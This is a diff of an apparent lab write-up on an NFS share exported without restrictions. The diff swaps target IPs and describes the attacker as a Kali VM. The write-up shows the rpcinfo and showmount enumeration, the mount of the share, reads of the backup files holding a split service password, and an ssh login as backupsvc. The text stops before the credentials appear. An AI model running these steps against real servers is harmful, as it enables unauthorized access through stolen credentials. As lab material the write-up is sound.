@@ -8,9 +8,9 @@ An NFS share exported without host or authentication restrictions discloses back
 
 | Item | Value |
 |---|---|
-| Target | 192.168.144.131 |
+| Target | 192.168.144.200 |
 | Service | NFSv3/v4, rpcbind, port 111/2049/tcp |
-| Attacker | Kali, 192.168.144.129 |
+| Attacker | Kali VM on the same host-only lab network |
 | Tooling | nmap, rpcinfo, showmount, mount.nfs, ssh |
 
 ## Vulnerability
@@ -26,12 +26,12 @@ The share contains plaintext operational notes that, combined, disclose a servic
 ## Reconnaissance and enumeration
 
 ```
-rpcinfo -p 192.168.144.131
-showmount -e 192.168.144.131
+rpcinfo -p 192.168.144.200
+showmount -e 192.168.144.200
 ```
 
 ```
-Export list for 192.168.144.131:
+Export list for 192.168.144.200:
 /srv/backups *
 ```
 
@@ -39,7 +39,7 @@ Export list for 192.168.144.131:
 
 ```
 sudo mkdir -p /mnt/cav-backups
-sudo mount -t nfs 192.168.144.131:/srv/backups /mnt/cav-backups
+sudo mount -t nfs 192.168.144.200:/srv/backups /mnt/cav-backups
 find /mnt/cav-backups -maxdepth 2 -type f -ls
 cat /mnt/cav-backups/backup.conf
 cat /mnt/cav-backups/backup-service.txt
@@ -52,7 +52,7 @@ The three files together yield:
 - A password value present in `backup.conf` alongside unrelated host/protocol notes, despite `hosts.txt` implying an empty `BACKUP_PASSWORD`. The credential is deliberately split across files to require correlation rather than a single obvious read.
 
 ```
-ssh backupsvc@192.168.144.131
+ssh backupsvc@192.168.144.200
 ```
 The credentials recovered from the exposed backup files are:
 
